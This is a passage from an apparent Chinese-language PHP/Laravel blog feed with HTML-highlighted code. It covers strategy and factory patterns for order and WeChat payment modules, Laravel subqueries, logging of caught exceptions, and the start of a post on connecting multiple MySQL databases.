class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Exceptions</span>\<span class="title">InvalidRequestException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>\<span class="title">Strategy</span>\<span class="title">VipStrategy</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PayOrderFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span><span class="params">($orderType)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $map = [</span><br><span class="line">            <span class="string">"vip"</span> =&gt; <span class="keyword">new</span> VipStrategy(),</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($map[$orderType])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $map[$orderType];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidRequestException(<span class="string">"订单类型不存在"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PayOrder/Strategy/VipStrategy.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>\<span class="title">Strategy</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>\<span class="title">PayOrderStrategy</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VipStrategy</span> <span class="keyword">extends</span> <span class="title">PayOrderStrategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createOrder</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 1. 创建订单</span></span><br><span class="line"><span class="comment">         * 2. 异常捕获及事务回滚，如果创建失败，直接抛出</span></span><br><span class="line"><span class="comment">         * 3. 组装并返回支付参数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 支付所需参数</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'out_trade_no'</span> =&gt; <span class="string">""</span>,</span><br><span class="line">            <span class="string">'total_fee'</span>    =&gt; <span class="string">""</span>,</span><br><span class="line">            <span class="string">'body'</span>         =&gt; <span class="string">""</span>,</span><br><span class="line">            <span class="string">'openid'</span>       =&gt; <span class="string">""</span>,</span><br><span class="line">            <span class="comment">// VIP 支付回调地址</span></span><br><span class="line">            <span class="string">'notify_url'</span>   =&gt; <span class="string">""</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="支付模块"><a href="#支付模块" class="headerlink" title="支付模块"></a>支付模块</h3><p><code>Payment/PaymentStrategy.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PaymentStrategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">(array $order)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Payment/PaymentContext.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaymentContext</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PaymentStrategy $strategy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(PaymentStrategy $strategy)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;strategy = $strategy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">(array $order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strategy-&gt;pay($order);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Payment/PaymentFactory</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">Strategy</span>\<span class="title">Wechat</span>\<span class="title">AppStrategy</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">Strategy</span>\<span class="title">Wechat</span>\<span class="title">MiniStrategy</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">Strategy</span>\<span class="title">Wechat</span>\<span class="title">ScanStrategy</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yansongda</span>\<span class="title">Pay</span>\<span class="title">Exceptions</span>\<span class="title">BusinessException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaymentFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span><span class="params">($payType)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $map = [</span><br><span class="line">            <span class="string">"mini"</span> =&gt; <span class="keyword">new</span> MiniStrategy(),</span><br><span class="line">            <span class="string">"app"</span>  =&gt; <span class="keyword">new</span> AppStrategy(),</span><br><span class="line">            <span class="string">"scan"</span> =&gt; <span class="keyword">new</span> ScanStrategy(),</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($map[$payType])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $map[$payType];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(<span class="string">"微信支付类型错误"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Payment/Strategy/Wechat/MiniStrategy.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">Strategy</span>\<span class="title">Wechat</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">PaymentStrategy</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yansongda</span>\<span class="title">Pay</span>\<span class="title">Pay</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiniStrategy</span> <span class="keyword">implements</span> <span class="title">PaymentStrategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $config = config(<span class="string">'pay.wechat'</span>);</span><br><span class="line">        $config[<span class="string">'notify_url'</span>] = env(<span class="string">'HOST'</span>) . $data[<span class="string">"notify_url"</span>];</span><br><span class="line">        $order = [</span><br><span class="line">            <span class="string">'out_trade_no'</span> =&gt; $data[<span class="string">"order_no"</span>],</span><br><span class="line">            <span class="string">'total_fee'</span>    =&gt; $data[<span class="string">'price'</span>],</span><br><span class="line">            <span class="string">'body'</span>         =&gt; $data[<span class="string">"body"</span>],</span><br><span class="line">            <span class="string">'openid'</span>       =&gt; $data[<span class="string">"open_id"</span>],</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">return</span> Pay::wechat($config)-&gt;miniapp($order);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Payment/Strategy/Wechat/AppStrategy</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">Strategy</span>\<span class="title">Wechat</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Payment</span>\<span class="title">PaymentStrategy</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppStrategy</span> <span class="keyword">implements</span> <span class="title">PaymentStrategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">(array $order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement pay() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">(VipPackageRequest $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 1. 验参</span></span><br><span class="line"><span class="comment">         * 2. 组装参数</span></span><br><span class="line"><span class="comment">         * 3. 创建VIP 套餐订单</span></span><br><span class="line"><span class="comment">         * 4. 支付</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $params = $request-&gt;all();</span><br><span class="line"></span><br><span class="line">        $data = [];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $orderStrategy = PayOrderFactory::getInstance(<span class="string">"vip"</span>);</span><br><span class="line">            $order = (<span class="keyword">new</span> PayOrderContext($orderStrategy))-&gt;createOrder($data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// $params["pay_type"] 可以是小程序支付、App 支付、扫码支付</span></span><br><span class="line">            $paymentStrategy = PaymentFactory::getInstance($params[<span class="string">"pay_type"</span>]);</span><br><span class="line">            $result = (<span class="keyword">new</span> PaymentContext($paymentStrategy))-&gt;pay($order);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success($result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> InternalException($exception-&gt;getMessage(), $exception);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里仅仅只是就订单和支付模块，简单重构了下，仍有不足的地方，（比如现在需要加入支付宝或者银行卡支付）还需要不断完善。</p><p>实际项目往往比这个场景要复杂，需要考虑的东西更多。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 Laravel 中使用子查询</title>
      <link href="/how-to-use-subqueries-in-laravel/"/>
      <url>/how-to-use-subqueries-in-laravel/</url>
      
        <content type="html"><![CDATA[<p>这里并不讨论子查询的效率问题，而是单就如何在Laravel 中使用子查询展开讨论。</p><a id="more"></a><p>使用子查询时，必须遵循以下规则：</p><ul><li>子查询必须括在圆括号中</li><li>子查询的 SELECT 子句中只能有一个列，除非主查询中有多个列，用于与子查询选中的列相比较</li><li>子查询不能使用 ORDER BY，不过主查询可以。在子查询中，GROUP BY 可以起到同 ORDER BY 相同的作用</li><li>返回多行数据的子查询只能同多值操作符一起使用，比如 IN 操作符</li><li>SELECT 列表中不能包含任何对 BLOB、ARRAY、CLOB 或者 NCLOB 类型值的引用子查询不能直接用在集合函数中</li><li>BETWEEN 操作符不能同子查询一起使用，但是 BETWEEN 操作符可以用在子查询中</li></ul><p>在Laravel 中创建子查询有两种方式：</p><ol><li>构建 raw 语句</li><li>使用查询构造器的闭包</li></ol><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sub = UserAccountModel::selectRaw(<span class="string">"max(balance) as balance"</span>);</span><br><span class="line">$result = UserAccountModel::whereRaw(<span class="string">"balance = (&#123;$sub-&gt;toSql()&#125;)"</span>)</span><br><span class="line">    -&gt;mergeBindings($sub-&gt;getQuery())</span><br><span class="line">    -&gt;first();</span><br></pre></td></tr></table></figure><p>这里用到了几个API：<br><strong>1. <code>toSql()</code> 获取不带 binding 参数的 SQL 语句（通常是带问号的SQL）：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select max(balance) as balance from &#96;user_account&#96;&quot;</span><br></pre></td></tr></table></figure><p><strong>2. <code>getQuery()</code> 获取 binding 参数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Database\Query\Builder &#123;<span class="comment">#1015 ▼</span></span><br><span class="line">  +connection: Illuminate\Database\MySqlConnection &#123;<span class="comment">#982 ▶&#125;</span></span><br><span class="line">  +grammar: Illuminate\Database\Query\Grammars\MySqlGrammar &#123;<span class="comment">#983 ▶&#125;</span></span><br><span class="line">  +processor: Illuminate\Database\Query\Processors\MySqlProcessor &#123;<span class="comment">#984&#125;</span></span><br><span class="line">  +bindings: <span class="keyword">array</span>:<span class="number">9</span> [▶]</span><br><span class="line">  +aggregate: <span class="keyword">null</span></span><br><span class="line">  +columns: <span class="keyword">array</span>:<span class="number">1</span> [▶]</span><br><span class="line">  +distinct: <span class="keyword">false</span></span><br><span class="line">  +from: <span class="string">"user_account"</span></span><br><span class="line">  +joins: <span class="keyword">null</span></span><br><span class="line">  +wheres: []</span><br><span class="line">  +groups: <span class="keyword">null</span></span><br><span class="line">  +havings: <span class="keyword">null</span></span><br><span class="line">  +orders: <span class="keyword">null</span></span><br><span class="line">  +limit: <span class="keyword">null</span></span><br><span class="line">  +offset: <span class="keyword">null</span></span><br><span class="line">  +unions: <span class="keyword">null</span></span><br><span class="line">  +unionLimit: <span class="keyword">null</span></span><br><span class="line">  +unionOffset: <span class="keyword">null</span></span><br><span class="line">  +unionOrders: <span class="keyword">null</span></span><br><span class="line">  +lock: <span class="keyword">null</span></span><br><span class="line">  +beforeQueryCallbacks: []</span><br><span class="line">  +operators: <span class="keyword">array</span>:<span class="number">30</span> [▶]</span><br><span class="line">  +useWritePdo: <span class="keyword">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. <code>mergeBindings()</code> 将 binding 参数合并到查询中</strong></p><p>最终获得SQL 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;user_account&#96; where &#96;balance&#96; &#x3D; (select max(balance) as balance from &#96;user_account&#96; limit 1) limit 1</span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>直接使用查询构造器自带的闭包查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result = UserAccountModel::where(<span class="string">"balance"</span>, <span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">    $query-&gt;selectRaw(<span class="string">"max(balance) as balance"</span>)</span><br><span class="line">        -&gt;from(<span class="string">"user_account"</span>)</span><br><span class="line">        -&gt;value(<span class="string">"balance"</span>);</span><br><span class="line">&#125;)-&gt;first();</span><br></pre></td></tr></table></figure><p>最终获得SQL 如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `user_account` where `balance` = (select max(balance) <span class="keyword">as</span> balance from `user_account` limit <span class="number">1</span>) limit <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 完善 Error/Exception 的捕获与处理</title>
      <link href="/laravel-improves-error-exception-capture-and-handling/"/>
      <url>/laravel-improves-error-exception-capture-and-handling/</url>
      
        <content type="html"><![CDATA[<p>前端时间，线上的管理后台的某个功能突然被告知无法正常使用。</p><a id="more"></a><p>抛出的异常如下：</p><blockquote><p>Trying to access array offset on value of type null</p></blockquote><p>初步判定就是因为某个数组或者对象的值为<code>null</code>，但是不确定具体是哪一行代码所导致。</p><p>于是马上打开<code>laravel.log</code> 系统日志文件，想从这里站牌找到异常原因。</p><p>找遍整个文件都没有发现相关字眼，这时我才意识到，本来Laravel 对于运行时错误，是会进行记录的，但是我将异常捕获到之后，并没有写入日志文件，而是直接返回给客户端了…</p><p>显然这对于后面排查问题相当不方便，所以必须做点什么，将异常信息给保存起来。</p><hr><p>PHP 系统级用户代码的错误类型有两种，可由 <code>try ... catch ...</code> 进行捕获。</p><ul><li><code>E_PARSE</code>：解析时错误（语法解析错误）通常因为少个分号、多个逗号之类的问题导致的致命错误</li><li><code>E_ERROR</code>：运行时错误，通常是因为调用了未定义的函数或方法而引发的致命错误。</li></ul><p>像文章开头的那个异常，就属于：<strong>运行时错误</strong>。这类异常正是我们需要捕获并记录的。</p><p>因为目前的代码已经实现了，捕获系统异常并返回给客户端等相关功能，所以剩下需要完成的就只是写入日志文件。</p><p>由于并不是所有异常都需要记录，比如由用户行为而造成的异常，就无需额外记录，所以最终实现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Exceptions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Traits</span>\<span class="title">ApiResponse</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 系统内部异常</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Class InternalException</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Exceptions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InternalException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">array</span> $doReport = [</span><br><span class="line">        \<span class="keyword">Exception</span>::class,       <span class="comment">// 所有异常的基类</span></span><br><span class="line">        \ErrorException::class,  <span class="comment">// 错误异常</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * InternalException constructor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $message</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int    $code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($message = <span class="string">"系统内部错误"</span>, $exception = null, $code = <span class="number">500</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($exception) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array(get_class($exception), <span class="keyword">$this</span>-&gt;doReport)) &#123;</span><br><span class="line">                \Log::error(<span class="string">"系统内部异常"</span>, [<span class="string">"exception"</span> =&gt; $exception]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">parent</span>::__construct($message, $code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalException($exception-&gt;getMessage(), $exception);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，如果后面如果再次遇到类似的问题，就可以直接去<code>laravel.log</code> 文件中找到具体的异常信息了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 连接多个 Mysql 数据库</title>
      <link href="/laravel-connects-to-multiple-mysql-databases/"/>
      <url>/laravel-connects-to-multiple-mysql-databases/</url>
      
        <content type="html"><![CDATA[<p>在Laravel 项目里面，如果需要使用多个数据库，其实是很简单的事情。</p><a id="more"></a><p>第一步，首先需要在 <code>.env</code> 文件中定义第二个数据库连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">DB_PORT=<span class="number">3306</span></span><br><span class="line">DB_DATABASE=database_name</span><br><span class="line">DB_USERNAME=root</span><br><span class="line">DB_PASSWORD=</span><br><span class="line"></span><br><span class="line">DB_HOST_CENTER=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">DB_PORT_CENTER=<span class="number">3306</span></span><br><span class="line">DB_DATABASE_CENTER=database_center</span><br><span class="line">DB_USERNAME_CENTER=root</span><br><span class="line">DB_PASSWORD_CENTER=</span><br></pre></td></tr></table></figure><p>第二步，在 <code>config/database.php</code> 文件中配置第二个数据库连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 